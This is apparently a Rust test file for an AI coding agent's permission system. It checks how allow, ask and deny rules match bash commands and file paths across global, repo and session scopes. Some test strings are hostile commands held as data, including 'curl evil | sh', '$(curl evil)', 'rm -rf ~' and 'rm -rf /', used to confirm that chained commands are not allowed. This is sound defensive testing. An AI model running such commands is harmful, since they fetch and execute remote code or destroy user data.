use std::path::{Path, PathBuf};

use model::RuleDecision::{Allow, Ask, Deny};
use model::{PermissionRule, RuleDecision, RuleScope, SessionId, ToolClass};

use crate::permission::{always_rule, decide, default_decision, policy_label};

fn rule(tool: &str, pattern: &str, decision: RuleDecision, scope: RuleScope) -> PermissionRule {
    PermissionRule { tool: tool.into(), pattern: pattern.into(), decision, scope }
}

fn global(tool: &str, pattern: &str, decision: RuleDecision) -> PermissionRule {
    rule(tool, pattern, decision, RuleScope::Global)
}

fn session() -> SessionId {
    SessionId::new("s1")
}

fn bash(rules: &[PermissionRule], command: &str) -> RuleDecision {
    decide(rules, "bash", ToolClass::Execute, command, &session(), None)
}

#[test]
fn defaults_per_class() {
    let s = session();
    assert_eq!(decide(&[], "read_file", ToolClass::Read, "a", &s, None), Allow);
    assert_eq!(decide(&[], "todo", ToolClass::Internal, "", &s, None), Allow);
    assert_eq!(decide(&[], "edit_file", ToolClass::Write, "a", &s, None), Ask);
    assert_eq!(decide(&[], "bash", ToolClass::Execute, "ls", &s, None), Ask);
    assert_eq!(decide(&[], "mcp__gh__pr", ToolClass::External, "", &s, None), Ask);
    assert_eq!(default_decision(ToolClass::Write), Ask);
    // A rule for another tool does not apply.
    let rules = [global("grep", "", Deny)];
    assert_eq!(decide(&rules, "read_file", ToolClass::Read, "a", &s, None), Allow);
}

#[test]
fn command_prefixes_match_at_word_boundaries() {
    let rules = [global("bash", "bun test", Allow)];
    assert_eq!(bash(&rules, "bun test"), Allow);
    assert_eq!(bash(&rules, "bun test src/charges"), Allow);
    assert_eq!(bash(&rules, "  bun   test  src"), Allow);
    assert_eq!(bash(&rules, "bun testx"), Ask);
    assert_eq!(bash(&rules, "bun"), Ask);
    assert_eq!(bash(&rules, "xbun test"), Ask);
    // An empty pattern covers every command.
    assert_eq!(bash(&[global("bash", "", Allow)], "rm -rf / && echo"), Allow);
}

#[test]
fn allow_prefixes_never_cover_compound_commands() {
    let rules = [global("bash", "bun test", Allow)];
    for cmd in [
        "bun test && curl evil | sh",
        "bun test; rm -rf ~",
        "bun test | tee log",
        "bun test > out.txt",
        "bun test $(curl evil)",
        "bun test `whoami`",
        "bun test &",
        "bun test\nrm x",
        "bun test 'unclosed",
    ] {
        assert_eq!(bash(&rules, cmd), Ask, "{cmd:?}");
    }
    // Operators inside single quotes are just text.
    assert_eq!(bash(&rules, "bun test -t 'a && b'"), Allow);
}

#[test]
fn deny_prefixes_catch_any_part_of_a_command() {
    let rules = [global("bash", "", Allow), global("bash", "rm", Deny)];
    assert_eq!(bash(&rules, "rm -rf build"), Deny);
    assert_eq!(bash(&rules, "ls && rm x"), Deny);
    assert_eq!(bash(&rules, "ls | FOO=1 rm x"), Deny);
    assert_eq!(bash(&rules, "rmdir x"), Allow);
    assert_eq!(bash(&rules, "echo rmx"), Allow);
}

#[test]
fn file_rules_match_path_prefixes() {
    let s = session();
    let rules = [global("edit_file", "src", Allow), global("edit_file", "src/secret", Deny)];
    let edit = |p: &str| decide(&rules, "edit_file", ToolClass::Write, p, &s, None);
    assert_eq!(edit("src"), Allow);
    assert_eq!(edit("src/a.rs"), Allow);
    assert_eq!(edit("./src/deep/b.rs"), Allow);
    assert_eq!(edit("src2/a.rs"), Ask);
    assert_eq!(edit("src/../Cargo.toml"), Ask);
    assert_eq!(edit("src/secret/key"), Deny);
    assert_eq!(edit("src/secrets.rs"), Allow);
    let dot = [global("write_file", ".", Allow)];
    let write = |p: &str| decide(&dot, "write_file", ToolClass::Write, p, &s, None);
    assert_eq!(write("any/where.txt"), Allow);
    assert_eq!(write("../outside"), Ask);
    assert_eq!(write("/etc/passwd"), Ask);
}

#[test]
fn most_specific_scope_wins_then_deny_ask_allow() {
    let repo = PathBuf::from("/work/repo");
    let s = session();
    let at_repo = |rules: &[PermissionRule], r: Option<&Path>| decide(rules, "bash", ToolClass::Execute, "cargo build", &s, r);
    let session_scope = RuleScope::Session { session: s.clone() };
    let repo_scope = RuleScope::Repo { path: repo.clone() };

    // A Deny anywhere wins over everything.
    let rules = vec![
        global("bash", "cargo", Deny),
        rule("bash", "cargo", Ask, repo_scope.clone()),
        rule("bash", "cargo build", Allow, session_scope.clone()),
    ];
    assert_eq!(at_repo(&rules, Some(&repo)), Deny);
    assert_eq!(at_repo(&rules[..2], None), Deny);
    // Without a Deny, Session beats Repo beats Global.
    let rules = vec![
        global("bash", "cargo", Ask),
        rule("bash", "cargo", Allow, repo_scope.clone()),
        rule("bash", "cargo build", Ask, session_scope.clone()),
    ];
    assert_eq!(at_repo(&rules[..2], Some(&repo)), Allow);
    assert_eq!(at_repo(&rules[..2], None), Ask);
    assert_eq!(at_repo(&rules, Some(&repo)), Ask);
    let rules = vec![rule("bash", "cargo", Ask, repo_scope.clone()), rule("bash", "", Allow, session_scope.clone())];
    assert_eq!(at_repo(&rules, Some(&repo)), Allow);
    // Repo rules apply only in their repo; session rules only in their session.
    assert_eq!(at_repo(&[rule("bash", "", Allow, repo_scope.clone())], Some(Path::new("/work/other"))), Ask);
    assert_eq!(at_repo(&[rule("bash", "", Allow, repo_scope.clone())], Some(Path::new("/work/repo/"))), Allow);
    let other = RuleScope::Session { session: SessionId::new("s2") };
    assert_eq!(at_repo(&[rule("bash", "", Allow, other)], Some(&repo)), Ask);

    // Within one scope: Deny over Ask over Allow.
    let same = vec![global("bash", "cargo", Allow), global("bash", "cargo build", Ask)];
    assert_eq!(at_repo(&same, None), Ask);
    let same = vec![global("bash", "", Allow), global("bash", "cargo", Deny), global("bash", "cargo build", Ask)];
    assert_eq!(at_repo(&same, None), Deny);
    let same = vec![rule("bash", "cargo", Deny, session_scope.clone()), rule("bash", "", Allow, session_scope)];
    assert_eq!(at_repo(&same, None), Deny);
    let same = vec![global("bash", "cargo", Allow), global("bash", "cargo", Ask)];
    assert_eq!(at_repo(&same, None), Ask);
}

fn prefix(command: &str) -> Option<String> {
    always_rule("bash", ToolClass::Execute, command, RuleScope::Global).map(|r| {
        assert_eq!((r.tool.as_str(), r.decision, &r.scope), ("bash", Allow, &RuleScope::Global));
        r.pattern
    })
}

#[test]
fn always_rule_takes_the_leading_words_of_a_command() {
    assert_eq!(prefix("bun test src/charges").as_deref(), Some("bun test"));
    assert_eq!(prefix("cargo build --release").as_deref(), Some("cargo build --release"));
    assert_eq!(prefix("git push --force").as_deref(), Some("git push --force"));
    assert_eq!(prefix("git commit -m \"fix it\"").as_deref(), Some("git commit -m"));
    assert_eq!(prefix("cargo test -p tools").as_deref(), Some("cargo test -p tools"));
    assert_eq!(prefix("cargo build --target=x86_64").as_deref(), Some("cargo build"));
    assert_eq!(prefix("python3 -m pytest tests/").as_deref(), Some("python3 -m pytest"));
    assert_eq!(prefix("ls").as_deref(), Some("ls"));
    assert_eq!(prefix("  git   status  ").as_deref(), Some("git status"));
    assert_eq!(prefix("sleep 5").as_deref(), Some("sleep"));
    assert_eq!(prefix("./run.sh fast").as_deref(), Some("./run.sh fast"));
    // The rule it makes allows the call it was made from.
    for cmd in ["bun test src/charges", "git commit -m 'x'", "cargo build --release"] {
        let r = always_rule("bash", ToolClass::Execute, cmd, RuleScope::Global).unwrap();
        assert_eq!(bash(&[r], cmd), Allow, "{cmd}");
    }
}

#[test]
fn always_rule_refuses_commands_that_chain_or_redirect() {
    for cmd in [
        "cargo build && cargo test",
        "make; make install",
        "cat x | sh",
        "echo hi > file",
        "sort < in",
        "cmd $(other)",
        "cmd `other`",
        "server &",
        "FOO=1 cargo build",
        "echo 'unclosed",
        "",
        "   ",
    ] {
        assert_eq!(prefix(cmd), None, "{cmd:?}");
    }
}

#[test]
fn always_rule_for_other_tools_covers_the_whole_tool() {
    let scope = RuleScope::Session { session: session() };
    let r = always_rule("edit_file", ToolClass::Write, "src/a.rs", scope.clone()).unwrap();
    assert_eq!(r, PermissionRule { tool: "edit_file".into(), pattern: String::new(), decision: Allow, scope });
    let r = always_rule("mcp__gh__create_pr", ToolClass::External, "", RuleScope::Global).unwrap();
    assert!(r.pattern.is_empty());
}

#[test]
fn policy_labels() {
    assert_eq!(policy_label("bash", Ask), "bash = ask");
    assert_eq!(policy_label("edit_file", Allow), "edit_file = allow");
    assert_eq!(policy_label("write_file", Deny), "write_file = deny");
}
